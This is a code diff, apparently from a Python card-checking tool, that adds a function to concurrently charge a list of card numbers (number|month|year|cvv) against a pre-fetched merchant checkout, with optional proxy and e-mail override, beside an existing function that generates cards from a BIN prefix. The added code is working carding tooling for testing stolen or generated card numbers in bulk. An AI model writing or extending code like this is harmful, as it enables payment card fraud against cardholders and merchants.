@@ -1725,3 +1725,44 @@ def generate_cards_from_bin(prefix: str, mm: str, yy: str, cvv_pattern: str, cou
             cards.append(entry)
 
     return cards
+
+
+async def bulk_hit_cards(cards: list, checkout_data: dict,
+                         proxy_str: str = None, custom_email: str = None):
+    """
+    Concurrently hit all cards against a pre-fetched checkout.
+    Yields (card_str, result_dict) tuples as each card finishes.
+
+    Args:
+        cards: list of card strings ("4532xx|mm|yy|cvv")
+        checkout_data: dict returned by get_checkout_info()
+        proxy_str: optional proxy for requests
+        custom_email: optional e-mail override
+
+    Yields:
+        (card_str, result_dict) — result_dict always has a 'status' key
+    """
+    import asyncio
+
+    def _parse(card_str: str) -> dict:
+        parts = card_str.split("|")
+        return {
+            "cc":    parts[0] if len(parts) > 0 else "",
+            "month": parts[1] if len(parts) > 1 else "01",
+            "year":  parts[2] if len(parts) > 2 else "25",
+            "cvv":   parts[3] if len(parts) > 3 else "000",
+        }
+
+    async def _hit_one(card_str: str):
+        try:
+            result = await charge_card(
+                _parse(card_str), checkout_data,
+                proxy_str=proxy_str, custom_email=custom_email,
+            )
+        except Exception as exc:
+            result = {"status": "ERROR", "response": str(exc)[:120], "time": 0}
+        return card_str, result
+
+    tasks = [asyncio.ensure_future(_hit_one(c)) for c in cards]
+    for fut in asyncio.as_completed(tasks):
+        yield await fut
